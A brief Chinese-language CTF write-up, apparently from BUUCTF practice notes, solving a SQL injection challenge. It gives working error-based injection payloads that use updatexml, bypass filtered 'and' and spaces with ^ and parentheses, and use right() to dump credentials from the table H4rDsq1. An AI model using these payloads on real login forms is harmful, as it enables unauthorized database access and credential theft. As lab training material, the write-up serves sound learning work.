知识点：

1.报错注入

2.and替换（^),空格替换（（））

3.updatexml报错长度限制，right()绕过



参考：

https://xz.aliyun.com/t/5505



1.测试过滤

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/5460D9503C7A4D0B99BAA80EC5DC62E1clipboard.png)

union和union/**/sekect被过滤了，不能使用联结查询



2.存在报错，updatexml没有被过滤，可以考虑报错注入

但是and被过滤了，这里可以使用(^)绕过

空格也被过滤了，可以使用（）绕过

payload:

```javascript
username=admin&password=pass'^updatexml(1,concat(0x7e,(select(database()))
,0x7e),1)%23
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/5B62E7AEEB2C40AB8A39B639FB1D8EDCclipboard.png)





3.因为和前面几个sql一样都是极客大赛的，直接读flag

因为报错信息最多为30位，并不能完整的爆出flag,所以这里使用right()函数

paylaod:

```javascript
?username=admin&password=pass'^updatexml(1,concat(0x7e,right((select(SELECT(
group_concat(username,password))from(H4rDsq1))),50),0x7e),1)%23
```



调整，right()函数，起始值即可读出完整flag

